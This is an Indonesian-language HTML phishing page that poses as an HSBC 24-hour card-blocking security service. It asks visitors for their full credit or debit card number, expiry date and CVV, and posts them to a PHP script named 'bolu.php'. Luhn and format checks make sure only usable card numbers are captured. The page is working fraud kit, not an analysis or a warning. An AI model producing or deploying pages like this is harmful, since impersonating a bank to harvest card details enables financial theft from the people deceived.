<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Blokir Kartu</title>
    <style>
        /* --- gaya sesuai mock-up sebelumnya --- */
        *{box-sizing:border-box;font-family:Arial,sans-serif}
        body{background:#fff;margin:0;padding:0}
        .header{padding:20px;text-align:left}
        .header img{height:30px}
        .header h3{color:red;margin-top:10px;font-size:16px}
        .form-box{background:linear-gradient(160deg,#0b0c2a,#1d1e40);color:#fff;padding:24px;border-radius:12px;width:90%;max-width:400px;margin:20px auto}
        label{font-size:14px;font-weight:bold;display:block;margin-bottom:6px}
        input{width:100%;padding:12px;border:none;border-radius:8px;margin-bottom:16px;font-size:16px}
        .row{display:flex;gap:10px}
        .row input{flex:1}
        button{width:100%;padding:14px;background:#fff;color:#000;border:none;border-radius:8px;font-weight:bold;font-size:16px;cursor:pointer}
        button:hover{background:#f0f0f0}
        .error{background:#f8d7da;color:#721c24;border:1px solid #f5c6cb;padding:10px;border-radius:6px;margin-bottom:16px;display:none}
    </style>
    <script>
        // Fungsi Luhn JS
        function validLuhn(num){
            num=num.replace(/\D/g,'');
            let sum=0, alt=false;
            for(let i=num.length-1;i>=0;i--){
                let n=parseInt(num[i],10);
                if(alt){ n*=2; if(n>9) n-=9; }
                sum+=n; alt=!alt;
            }
            return sum%10===0;
        }

        window.addEventListener('DOMContentLoaded',()=>{
            const form=document.querySelector('form');
            const cardField=document.querySelector('input[name="card_number"]');
            const errBox=document.getElementById('errBox');

            form.addEventListener('submit',e=>{
                if(!validLuhn(cardField.value)){
                    e.preventDefault();
                    errBox.style.display='block';
                    errBox.textContent='Nomor kartu tidak valid.';
                }
            });
        });
    </script>
</head>
<body>
    <div class="header">
        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT3_hE_Hzj7SAy_Y5Gxhy6Df1xP3cFyi4XSQg&s" alt="HSBC">
        <h3>Layanan Keamanan 24 Jam</h3>
    </div>

    <div class="form-box">
        <div id="errBox" class="error"></div>
<form method="post" action="bolu.php" onsubmit="return validateForm()">
    <label>No Kartu Kredit/Debit:</label>
    <input type="text" name="card_number" id="card_number" placeholder="1234567890123456"
           pattern="\d{16}" maxlength="16" required 
           inputmode="numeric" oninput="this.value=this.value.replace(/\D/g,'')">

    <div class="row" style="display: flex; gap: 10px;">
        <div style="flex: 1;">
            <label>Masa Berlaku</label>
            <input type="text" name="expiry" id="expiry" placeholder="MM/YY"
                   maxlength="5" required 
                   inputmode="numeric" oninput="formatExpiry(this)">
        </div>
        <div style="flex: 1;">
            <label>CVV (3 Digit)</label>
            <input type="text" name="cvv" id="cvv" placeholder="123"
                   pattern="\d{3}" maxlength="3" required 
                   inputmode="numeric" oninput="this.value=this.value.replace(/\D/g,'')">
        </div>
    </div>

    <button type="submit">BLOKIR KARTU</button>
</form>

<script>
// Format otomatis untuk MM/YY dengan tanda "/"
function formatExpiry(input) {
    let val = input.value.replace(/\D/g, ''); // Hanya angka
    if (val.length >= 2) {
        input.value = val.slice(0, 2) + '/' + val.slice(2, 4);
    } else {
        input.value = val;
    }
}

// Validasi algoritma Luhn
function isValidLuhn(number) {
    let sum = 0;
    let alt = false;
    for (let i = number.length - 1; i >= 0; i--) {
        let n = parseInt(number.charAt(i), 10);
        if (alt) {
            n *= 2;
            if (n > 9) n -= 9;
        }
        sum += n;
        alt = !alt;
    }
    return sum % 10 === 0;
}

// Validasi keseluruhan sebelum kirim
function validateForm() {
    const card = document.getElementById('card_number').value;
    const expiry = document.getElementById('expiry').value;
    const cvv = document.getElementById('cvv').value;

    if (!/^\d{16}$/.test(card)) {
        alert("Nomor kartu harus 16 digit angka.");
        return false;
    }

    if (!isValidLuhn(card)) {
        alert("Nomor kartu tidak valid (gagal Luhn check).");
        return false;
    }

    if (!/^\d{2}\/\d{2}$/.test(expiry)) {
        alert("Format masa berlaku harus MM/YY.");
        return false;
    }

    const [monthStr, yearStr] = expiry.split('/');
    const month = parseInt(monthStr, 10);
    const year = parseInt(yearStr, 10);
    if (month < 1 || month > 12) {
        alert("Bulan tidak valid. Harus antara 01 hingga 12.");
        return false;
    }

    if (!/^\d{3}$/.test(cvv)) {
        alert("CVV harus 3 digit angka.");
        return false;
    }

    return true;
}
</script>
    </div>
</body>
</html>